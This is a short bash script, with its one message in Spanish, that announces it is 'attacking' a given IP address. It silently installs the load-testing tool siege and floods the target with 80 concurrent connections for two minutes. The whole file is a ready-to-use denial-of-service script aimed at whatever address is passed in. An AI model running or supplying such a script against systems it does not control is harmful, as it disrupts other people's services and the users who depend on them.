#!/bin/bash

IP=$1

echo "Atacando IP: $1"

apt update -y >> /dev/null 2>&1
apt install siege -y >> /dev/null 2>&1
siege -t120S -c80 $IP